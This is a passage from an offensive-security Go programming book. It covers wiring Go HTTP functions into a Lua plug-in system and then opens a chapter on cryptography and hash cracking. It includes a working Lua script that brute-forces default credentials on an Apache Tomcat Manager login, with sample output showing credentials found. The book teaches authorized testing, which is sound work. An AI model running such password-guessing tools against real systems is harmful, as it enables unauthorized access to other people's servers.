        req.SetBasicAuth(username, password)
    }   
    if resp, err = client.Do(req); err != nil {
        l.Push(lua.LNumber(0))
        l.Push(lua.LBool(false))
        l.Push(lua.LString(fmt.Sprintf("Unable to send GET request: %s", err)))
        return 3
    }
    l.Push(lua.LNumber(resp.StatusCode))
    l.Push(lua.LBool(false))
    l.Push(lua.LString(""))
    return 3
}
Listing 10-5: Creating a get() function for Lua (/ch-10 /lua-core/cmd/scanner/main.go)
Much like your head() implementation, your get() function will return 
three values: the status code, a value expressing whether the system you’re 
trying to access requires basic authentication, and any error messages. The 
only real difference between the two functions is that your get() function 
accepts two additional string parameters: a username and a password u. If 
either of these values is set to a non-empty string, you’ll assume you have to 
perform basic authentication.
Now, some of you are probably thinking that the implementations are 
oddly specific, almost to the point of negating any flexibility, reusability, and 
portability of a plug-in system. It’s almost as if these functions were designed 
for a very specific use case—that is, to check for basic authentication—rather 
than for a general purpose. After all, why wouldn’t you return the response 
body or the HTTP headers? Likewise, why wouldn’t you accept more robust 
parameters to set cookies, other HTTP headers, or issue POST requests 
with a body, for example? 
Simplicity is the answer. Your implementations can act as a starting point 
for building a more robust solution. However, creating that solution would 
be a more significant endeavor, and you’d likely lose the code’s purpose 
while trying to navigate implementation details. Instead, we’ve chosen to 
do things in a more basic, less flexible fashion to make the general, founda-
tional concepts simpler to understand. An improved implementation would 
likely expose complex user-defined types that better represent the entirety 
of, for example, the http.Request and http.Response types. Then, rather than 
accepting and returning multiple parameters from Lua, you could simplify 
前沿信安资讯阵地  公众号：i nf osrc
Go Plugins and Extendable Tools   229
your function signatures, reducing the number of parameters you accept 
and return. We encourage you to work through this challenge as an exer-
cise, changing the code to accept and return user-defined structs rather 
than primitive types.
Registering the Functions with the Lua VM
Up to this point, you’ve implemented wrapper functions around the neces-
sary net/http calls you intend to use, creating the functions so gopher-lua can 
consume them. However, you need to actually register the functions with the 
Lua VM. The function in Listing 10-6 centralizes this registration process.
u const LuaHttpTypeName = "http"
func register(l *lua.LState) {
    v mt := l.NewTypeMetatable(LuaHttpTypeName)
    w l.SetGlobal("http", mt)
    // static attributes
    x l.SetField(mt, "head", l.NewFunction(head))
    l.SetField(mt, "get", l.NewFunction(get))
}
Listing 10-6: Registering plug-ins with Lua (/ch-10 /lua-core/cmd/scanner/main.go)
You start by defining a constant that will uniquely identify the namespace 
you’re creating in Lua u. In this case, you’ll use http because that’s essentially 
the functionality you’re exposing. In your register() function, you accept a 
pointer to a lua.LState, and use that namespace constant to create a new Lua 
type via a call to l.NewTypeMetatable() v. You’ll use this metatable to track 
types and functions available to Lua. 
You then register a global name, http, on the metatable w. This makes 
the http implicit package name available to the Lua VM. On the same meta-
table, you also register two fields by using calls to l.SetField() x. Here, you 
define two static functions named head() and get(), available on the http 
namespace. Since they’re static, you can call them via http.get() and http 
.head() without having to create an instance of type http in Lua. 
As you may have noted in the SetField() calls, the third parameter is the 
destination function that’ll handle the Lua calls. In this case, those are your 
get() and head() functions you previously implemented. These are wrapped 
in a call to l.NewFunction(), which accepts a function of form func(*LState) 
int, which is how you defined your get() and head() functions. They return a 
*lua.LFunction. This might be a little overwhelming, since we’ve introduced a 
lot of data types and you’re probably unfamiliar with gopher-lua. Just under-
stand that this function is registering the global namespace and function 
names and creating mappings between those function names and your 
Go functions.
前沿信安资讯阵地  公众号：i nf osrc
230   Chapter 10
Writing Your Main Function
Lastly, you’ll need to create your main() function, which will coordinate this 
registration process and execute the plug-in (Listing 10-7).
u const PluginsDir = "../../plugins"
func main() {
    var (
        l     *lua.LState
        files []os.FileInfo
        err   error
        f     string
    )
    v l = lua.NewState()
    defer l.Close()
    w register(l)
    x if files, err = ioutil.ReadDir(PluginsDir); err != nil {
        log.Fatalln(err)
    }
    y for idx := range files {
        fmt.Println("Found plugin: " + files[idx].Name())
        f = fmt.Sprintf("%s/%s", PluginsDir, files[idx].Name())
        z if err := l.DoFile(f); err != nil {
            log.Fatalln(err)
        }
    }
}
Listing 10-7: Registering and calling Lua plug-ins ( /ch-10/lua-core/cmd/scanner/main.go)
As you did for your main() function in the Go example, you’ll hardcode 
the directory location from which you’ll load your plug-ins u. In your main() 
function, you issue a call to lua.NewState() v to create a new *lua.LState 
instance. The lua.NewState() instance is the key item you’ll need to set up 
your Lua VM, register your functions and types, and execute arbitrary Lua 
scripts. You then pass that pointer to the register() function you created 
earlier w, which registers your custom http namespace and functions on the 
state. You read the contents of your plug-ins directory x, looping through 
each file in the directory y. For each file, you call l.DoFile(f) z, where f 
is the absolute path to the file. This call executes the contents of the file 
within the Lua state on which you registered your custom types and func-
tions. Basically, DoFile() is gopher-lua’s way of allowing you to execute entire 
files as if they were stand-alone Lua scripts. 
前沿信安资讯阵地  公众号：i nf osrc
Go Plugins and Extendable Tools   231
Creating Your Plug-in Script
Now let’s take a look at your Tomcat plug-in script, written in Lua 
(Listing 10-8).
usernames = {"admin", "manager", "tomcat"}
passwords = {"admin", "manager", "tomcat", "password"}
status, basic, err = http.head("10.0.1.20", 8080, "/manager/html") u
if err ~= "" then
    print("[!] Error: "..err)
    return
end
if status ~= 401 or not basic then
    print("[!] Error: Endpoint does not require Basic Auth. Exiting.")
    return
end
print("[+] Endpoint requires Basic Auth. Proceeding with password guessing")
for i, username in ipairs(usernames) do
    for j, password in ipairs(passwords) do
        status, basic, err = http.get("10.0.1.20", 8080, username, password, "/manager/html") v
        if status == 200 then
            print("[+] Found creds - "..username..":"..password)
            return
        end
    end 
end
Listing 10-8: A Lua plug-in for Tomcat password guessing (/ch-10 /lua-core /plugins/tomcat.lua)
Don’t worry too much about the vulnerability-checking logic. It’s essen-
tially the same as the logic you created in the Go version of this plug-in; it 
performs basic password guessing against the Tomcat Manager portal after 
it fingerprints the application by using a HEAD request. We’ve highlighted 
the two most interesting items. 
The first is a call to http.head("10.0.1.20", 8080, "/manager/html") u. 
Based off your global and field registrations on the state metatable, you 
can issue a call to a function named http.head() without receiving a Lua 
error. Additionally, you’re supplying the call with the three parameters your 
head() function expected to read from the LState instance. The Lua call is 
expecting three return values, which align with the numbers and types you 
pushed onto the LState before you exited the Go function. 
The second item is your call to http.get() v, which is similar to the 
http.head() function call. The only real difference is that you are passing 
username and password parameters to the http.get() function. If you refer 
back to the Go implementation of your get() function, you’ll see that we’re 
reading these two additional strings from the LState instance.
前沿信安资讯阵地  公众号：i nf osrc
232   Chapter 10
Testing the Lua Plug-in
This example isn’t perfect and could benefit from additional design con-
siderations. But as with most adversarial tools, the most important thing is 
that it works and solves a problem. Running your code proves that it does, 
indeed, work as expected:
$ go run main.go 
Found plugin: tomcat.lua
[+] Endpoint requires Basic Auth. Proceeding with password guessing
[+] Found creds - tomcat:tomcat
Now that you have a basic working example, we encourage you to 
improve the design by implementing user-defined types so that you aren’t 
passing lengthy lists of arguments and parameters to and from functions. 
With this, you’ll likely need to explore registering instance methods on 
your struct, whether for setting and getting values in Lua or for calling 
methods on a specifically implemented instance. As you work through this, 
you’ll notice that your code will get significantly more complex, since you’ll 
be wrapping a lot of your Go functionality in a Lua-friendly manner.
Summary
As with many design decisions, there are multiple ways to skin a cat. Whether 
you’re using Go’s native plug-in system or an alternative language like Lua, 
you must consider trade-offs. But regardless of your approach, you can easily 
extend Go to make rich security frameworks, particularly since the addition 
of its native plug-in system.
In the next chapter, you’ll tackle the rich topic of cryptography. We’ll 
demonstrate various implementations and use cases, and then build an RC2 
symmetric-key brute-forcer.
前沿信安资讯阵地  公众号：i nf osrc
11
IM PL E M E N T ING  A N D AT TACK ING 
CRY P T OG R A PH Y
A conversation about security isn’t com-
plete without exploring cryptography. When 
organizations use cryptographic practices, 
they can help conserve the integrity, confiden-
tiality, and authenticity of their information and sys-
tems alike. As a tool developer, you’d likely need to 
implement cryptographic features, perhaps for SSL/TLS communications, 
mutual authentication, symmetric-key cryptography, or password hashing. 
But developers often implement cryptographic functions insecurely, which 
means the offensive-minded can exploit these weaknesses to compromise 
sensitive, valuable data, such as social security or credit card numbers. 
This chapter demonstrates various implementations of cryptography 
in Go and discusses common weaknesses you can exploit. Although we 
provide introductory information for the different cryptographic functions 
and code blocks, we’re not attempting to explore the nuances of crypto-
graphic algorithms or their mathematical foundations. That, frankly, is 
far beyond our interest in (or knowledge of) cryptography. As we’ve stated 
前沿信安资讯阵地  公众号：i nf osrc
234   Chapter 11
before, don’t attempt anything in this chapter against resources or assets 
without explicit permission from the owner. We’re including these discus-
sions for learning purposes, not to assist in illegal activities.
Reviewing Basic Cryptography Concepts
Before we explore crypto in Go, let’s discuss a few basic cryptography con-
cepts. We’ll make this short to keep you from falling into a deep sleep.
First, encryption (for the purposes of maintaining confidentiality) 
is just one of the tasks of cryptography. Encryption, generally speaking, is 
a two-way function with which you can scramble data and subsequently 
unscramble it to retrieve the initial input. The process of encrypting data 
renders it meaningless until it’s been decrypted. 
Both encryption and decryption involve passing the data and an accom-
panying key into a cryptographic function. The function outputs either 
the encrypted data (called ciphertext) or the original, readable data (called 
cleartext). Various algorithms exist to do this. Symmetric algorithms use the 
same key during the encryption and decryption processes, whereas asymmetric 
algorithms use different keys for encryption and decryption. You might use 
encryption to protect data in transit or to store sensitive information, such 
as credit card numbers, to decrypt later, perhaps for convenience during a 
future purchase or for fraud monitoring.
On the other hand, hashing is a one-way process for mathematically 
scrambling data. You can pass sensitive information into a hashing func-
tion to produce a fixed-length output. When you’re working with strong 
algorithms, such as those in the SHA-2 family, the probability that different 
inputs produce the same output is extremely low. That is, there is a low like-
lihood of a collision. Because they’re nonreversible, hashes are commonly 
used as an alternative to storing cleartext passwords in a database or to 
perform integrity checking to determine whether data has been changed. 
If you need to obscure or randomize the outputs for two identical inputs, 
you use a salt, which is a random value used to differentiate two identical 
inputs during the hashing process. Salts are common for password storage 
because they allow multiple users who coincidentally use identical pass-
words to still have different hash values.
Cryptography also provides a means for authenticating messages. A message 
authentication code (MAC) is the output produced from a special one-way cryp-
tographic function. This function consumes the data itself, a secret key, and 
an initialization vector, and produces an output unlikely to have a collision. 
The sender of a message performs the function to generate a MAC and then 
includes the MAC as part of the message. The receiver locally calculates the 
MAC and compares it to the MAC they received. A match indicates that the 
sender has the correct secret key (that is, that the sender is authentic) and 
that the message was not changed (the integrity has been maintained). 
There! Now you should know enough about cryptography to under-
stand the contents of this chapter. Where necessary, we’ll discuss more 
specifics relevant to the given topic. Let’s start by looking at Go’s standard 
crypto library. 
前沿信安资讯阵地  公众号：i nf osrc
Implementing and Attacking Cryptography   235
Understanding the Standard Crypto Library
The beautiful thing about implementing crypto in Go is that the majority 
of cryptographic features you’ll likely use are part of the standard library. 
Whereas other languages commonly rely on OpenSSL or other third-party 
libraries, Go’s crypto features are part of the official repositories. This makes 
implementing crypto relatively straightforward, as you won’t have to install 
clumsy dependencies that’ll pollute your development environment. There 
are two separate repositories. 
The self-contained crypto package contains a variety of subpackages used 
for the most common cryptographic tasks and algorithms. For example, you 
could use the aes, des, and rc4 subpackages for implementing symmetric-key 
algorithms; the dsa and rsa subpackages for asymmetric encryption; and the 
md5, sha1, sha256, and sha512 subpackages for hashing. This is not an exhaus-
tive list; additional subpackages exist for other crypto functions, as well.
In addition to the standard crypto package, Go has an official, extended 
package that contains a variety of supplementary crypto functionality: 
golang .org/x/crypto. The functionality within includes additional hashing 
algorithms, encryption ciphers, and utilities. For example, the package con-
tains a bcrypt subpackage for bcrypt hashing (a better, more secure alterna-
tive for hashing passwords and sensitive data), acme/autocert for generating 
legitimate certificates, and SSH subpackages to facilitate communications 
over the SSH protocol. 
The only real difference between the built-in crypto and supplementary 
golang.org/x/crypto packages is that the crypto package adheres to more strin-
gent compatibility requirements. Also, if you wish to use any of the golang 
.org/x/crypto subpackages, you’ll first need to install the package by enter-
ing the following:
$ go get -u golang.org/x/crypto/bcrypt
For a complete listing of all the functionality and subpackages within 
the official Go crypto packages, check out the official documentation at 
https://golang.org/pkg/crypto/ and https://godoc.org/golang.org/x/crypto/.
The next sections delve into various crypto implementations. You’ll see 
how to use Go’s crypto functionality to do some nefarious things, such as 
crack password hashes, decrypt sensitive data by using a static key, and brute-
force weak encryption ciphers. You’ll also use the functionality to create tools 
that use TLS to protect your in-transit communications, check the integrity 
and authenticity of data, and perform mutual authentication.
Exploring Hashing
Hashing, as we mentioned previously, is a one-way function used to produce 
a fixed-length, probabilistically unique output based on a variable-length 
input. You can’t reverse this hash value to retrieve the original input source. 
Hashes are often used to store information whose original, cleartext source 
前沿信安资讯阵地  公众号：i nf osrc
236   Chapter 11
won’t be needed for future processing or to track the integrity of data. For 
example, it’s bad practice and generally unnecessary to store the cleartext 
version of the password; instead, you’d store the hash (salted, ideally, to 
ensure randomness between duplicate values). 
To demonstrate hashing in Go, we’ll look at two examples. The first 
attempts to crack a given MD5 or SHA-512 hash by using an offline diction-
ary attack. The second example demonstrates an implementation of bcrypt. 
As mentioned previously, bcrypt is a more secure algorithm for hashing 
sensitive data such as passwords. The algorithm also contains a feature that 
reduces its speed, making it harder to crack passwords.
Cracking an MD5 or SHA-256 Hash
Listing 11-1 shows the hash-cracking code. (All the code listings at the 
root location of / exist under the provided github repo https://github.com/
blackhat-go/bhg/.) Since hashes aren’t directly reversible, the code instead 
tries to guess the cleartext value of the hash by generating its own hashes 
of common words, taken from a word list, and then comparing the result-
ing hash value with the hash you have in hand. If the two hashes match, 
you’ve likely guessed the cleartext value. 